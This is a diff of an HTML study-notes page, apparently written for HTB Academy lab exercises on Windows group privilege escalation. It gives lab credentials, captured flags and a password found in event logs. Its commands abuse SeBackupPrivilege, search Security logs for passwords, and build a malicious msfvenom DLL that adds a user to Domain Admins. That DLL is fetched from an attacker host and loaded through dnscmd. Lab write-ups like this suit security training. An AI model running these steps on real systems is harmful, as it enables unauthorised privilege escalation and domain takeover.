@@ -20253,20 +20253,14 @@
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Windows User Privileges">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
+</li>
+      
+        <li class="md-nav__item">
   <a href="#windows-group-privileges" class="md-nav__link">
     <span class="md-ellipsis">
       Windows Group Privileges
     </span>
   </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -20469,11 +20463,149 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17"></a>type &#39;C:\TakeOwn\flag.txt&#39;
 </span></code></pre></div></td></tr></table></div>
 <p>Results: 1m_th3_f1l3_0wn3r_n0W!</p>
-<h3 id="windows-group-privileges">Windows Group Privileges</h3>
+<h2 id="windows-group-privileges">Windows Group Privileges</h2>
+<p>RDP to  with user "svc_backup" and password "HTB_@cademy_stdnt!". Leverage SeBackupPrivilege rights and obtain the flag located at c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-17-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-17-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-17-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-17-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-17-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-17-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-17-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-17-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-17-10">10</a></span>
+<span class="normal"><a href="#__codelineno-17-11">11</a></span>
+<span class="normal"><a href="#__codelineno-17-12">12</a></span>
+<span class="normal"><a href="#__codelineno-17-13">13</a></span>
+<span class="normal"><a href="#__codelineno-17-14">14</a></span>
+<span class="normal"><a href="#__codelineno-17-15">15</a></span>
+<span class="normal"><a href="#__codelineno-17-16">16</a></span>
+<span class="normal"><a href="#__codelineno-17-17">17</a></span>
+<span class="normal"><a href="#__codelineno-17-18">18</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>xfreerdp /v:10.129.43.42 /u:svc_backup /p:HTB_@cademy_stdnt! /cert:ignore
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a># Check privs and group memberships:
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4"></a>whoami /priv
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5"></a>whoami /groups
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6"></a>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7"></a># If SeBackupPrivilege is present, double check if it is enabled:
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8"></a>Get-SeBackupPrivilege
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9"></a>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10"></a># If disabled, enable it (and check it back):
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11"></a>Set-SeBackupPrivilege
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12"></a>Get-SeBackupPrivilege
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13"></a>whoami /priv
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14"></a>
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15"></a># Copy the file
+</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16"></a>Copy-FileSeBackupPrivilege &#39;c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt&#39; .\flag.txt
+</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17"></a>
+</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18"></a>type flag.txt
+</span></code></pre></div></td></tr></table></div>
+<p>Results: Car3ful_w1th_gr0up_m3mberSh1p! </p>
+<p><strong>RDP to  with user "logger" and password "HTB_@cademy_stdnt!" Using the methods demonstrated in this section find the password for the user mary.</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-18-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-18-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-18-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-18-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-18-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-18-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-18-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-18-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-18-10">10</a></span>
+<span class="normal"><a href="#__codelineno-18-11">11</a></span>
+<span class="normal"><a href="#__codelineno-18-12">12</a></span>
+<span class="normal"><a href="#__codelineno-18-13">13</a></span>
+<span class="normal"><a href="#__codelineno-18-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>xfreerdp /v:10.129.43.43 /u:logger /p:HTB_@cademy_stdnt! /cert:ignore
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3"></a># Confirming Group Membership
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4"></a>net localgroup &quot;Event Log Readers&quot;
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5"></a>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6"></a># Also
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7"></a>whoami /groups
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8"></a>
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9"></a># Searching Security Logs Using wevtutil (Windows Event Utility, used for querying and managing event logs):
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10"></a>wevtutil qe Security /rd:true /f:text | Select-String &quot;/user&quot;
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11"></a># qe Security → Queries the Security event log.
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12"></a># /rd:true → Reads events in reverse order (starting from the most recent).
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13"></a># /f:text  → Formats the output in plain text (instead of XML or JSON).
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14"></a># | Select-String &quot;/user&quot; → Pipes (`|`) the output to `Select-String`, which **searches for lines containing** `&quot;/user&quot;`.
+</span></code></pre></div></td></tr></table></div>
+<p>Results:  W1ntergreen_gum_2021!</p>
+<p><strong>RDP to  with user "netadm" and password "HTB_@cademy_stdnt!". Leverage membership in the DnsAdmins group to escalate privileges. Submit the contents of the flag located at c:\Users\Administrator\Desktop\DnsAdmins\flag.txt</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-19-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-19-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-19-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-19-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-19-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-19-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-19-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-19-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-19-10">10</a></span>
+<span class="normal"><a href="#__codelineno-19-11">11</a></span>
+<span class="normal"><a href="#__codelineno-19-12">12</a></span>
+<span class="normal"><a href="#__codelineno-19-13">13</a></span>
+<span class="normal"><a href="#__codelineno-19-14">14</a></span>
+<span class="normal"><a href="#__codelineno-19-15">15</a></span>
+<span class="normal"><a href="#__codelineno-19-16">16</a></span>
+<span class="normal"><a href="#__codelineno-19-17">17</a></span>
+<span class="normal"><a href="#__codelineno-19-18">18</a></span>
+<span class="normal"><a href="#__codelineno-19-19">19</a></span>
+<span class="normal"><a href="#__codelineno-19-20">20</a></span>
+<span class="normal"><a href="#__codelineno-19-21">21</a></span>
+<span class="normal"><a href="#__codelineno-19-22">22</a></span>
+<span class="normal"><a href="#__codelineno-19-23">23</a></span>
+<span class="normal"><a href="#__codelineno-19-24">24</a></span>
+<span class="normal"><a href="#__codelineno-19-25">25</a></span>
+<span class="normal"><a href="#__codelineno-19-26">26</a></span>
+<span class="normal"><a href="#__codelineno-19-27">27</a></span>
+<span class="normal"><a href="#__codelineno-19-28">28</a></span>
+<span class="normal"><a href="#__codelineno-19-29">29</a></span>
+<span class="normal"><a href="#__codelineno-19-30">30</a></span>
+<span class="normal"><a href="#__codelineno-19-31">31</a></span>
+<span class="normal"><a href="#__codelineno-19-32">32</a></span>
+<span class="normal"><a href="#__codelineno-19-33">33</a></span>
+<span class="normal"><a href="#__codelineno-19-34">34</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>xfreerdp /v:10.129.43.42 /u:netadm /p:HTB_@cademy_stdnt! /cert:ignore
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3"></a># Go to c:\Tools and you directly will see the adduser.dll. Otherwise, to generate it:
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4"></a>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5"></a>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6"></a># Generating Malicious DLL to add a user to the domain admins group using msfvenom from your attacking machine:
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7"></a>msfvenom -p windows/x64/exec cmd=&#39;net group &quot;domain admins&quot; netadm /add /domain&#39; -f dll -o adduser.dll
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8"></a>
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9"></a># Starting Local HTTP Server: 
+</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10"></a>python3 -m http.server 7777
+</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11"></a>
+</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12"></a># Downloading File to Target machine:
+</span><span id="__span-19-13"><a id="__codelineno-19-13" name="__codelineno-19-13"></a>wget &quot;http://10.10.14.3:7777/adduser.dll&quot; -outfile &quot;adduser.dll&quot;
+</span><span id="__span-19-14"><a id="__codelineno-19-14" name="__codelineno-19-14"></a>
+</span><span id="__span-19-15"><a id="__codelineno-19-15" name="__codelineno-19-15"></a># Loading this DLL as a normal user isn&#39;t successful. Only members of the `DnsAdmins` group are permitted to do this. 
+</span><span id="__span-19-16"><a id="__codelineno-19-16" name="__codelineno-19-16"></a>dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+</span><span id="__span-19-17"><a id="__codelineno-19-17" name="__codelineno-19-17"></a>
+</span><span id="__span-19-18"><a id="__codelineno-19-18" name="__codelineno-19-18"></a># With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn&#39;t give the ability to restart the DNS service. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let&#39;s check our current user&#39;s permissions on the DNS service.
+</span><span id="__span-19-19"><a id="__codelineno-19-19" name="__codelineno-19-19"></a>wmic useraccount where name=&quot;netadm&quot; get sid
+</span><span id="__span-19-20"><a id="__codelineno-19-20" name="__codelineno-19-20"></a>sc.exe sdshow DNS
+</span><span id="__span-19-21"><a id="__codelineno-19-21" name="__codelineno-19-21"></a>
+</span><span id="__span-19-22"><a id="__codelineno-19-22" name="__codelineno-19-22"></a>
+</span><span id="__span-19-23"><a id="__codelineno-19-23" name="__codelineno-19-23"></a># Stopping and starting the DNS Service
+</span><span id="__span-19-24"><a id="__codelineno-19-24" name="__codelineno-19-24"></a>sc.exe stop dns
+</span><span id="__span-19-25"><a id="__codelineno-19-25" name="__codelineno-19-25"></a>sc.exe start dns
+</span><span id="__span-19-26"><a id="__codelineno-19-26" name="__codelineno-19-26"></a>
+</span><span id="__span-19-27"><a id="__codelineno-19-27" name="__codelineno-19-27"></a># Confirming Group Membership
+</span><span id="__span-19-28"><a id="__codelineno-19-28" name="__codelineno-19-28"></a>net group &quot;Domain Admins&quot; /dom
+</span><span id="__span-19-29"><a id="__codelineno-19-29" name="__codelineno-19-29"></a>
+</span><span id="__span-19-30"><a id="__codelineno-19-30" name="__codelineno-19-30"></a># However, your session is still running at `Medium Mandatory Level`, which indicates you haven’t fully inherited the **Domain Admin** privileges yet.
+</span><span id="__span-19-31"><a id="__codelineno-19-31" name="__codelineno-19-31"></a>logoff
+</span><span id="__span-19-32"><a id="__codelineno-19-32" name="__codelineno-19-32"></a>
+</span><span id="__span-19-33"><a id="__codelineno-19-33" name="__codelineno-19-33"></a># And when you connect back, you will be Domain Admin.
+</span><span id="__span-19-34"><a id="__codelineno-19-34" name="__codelineno-19-34"></a>type c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
+</span></code></pre></div></td></tr></table></div>
+<p>Results: Dll_abus3_ftw!  </p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 15, 2025 13:29:13"><span class="timeago" datetime="2025-03-15T13:29:13+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 15, 2025 13:29:13">2025-03-15</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 15, 2025 20:21:43"><span class="timeago" datetime="2025-03-15T20:21:43+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 15, 2025 20:21:43">2025-03-15</span></small></br>
 
 
     <small>Created: February 23, 2025 21:12:05</small>
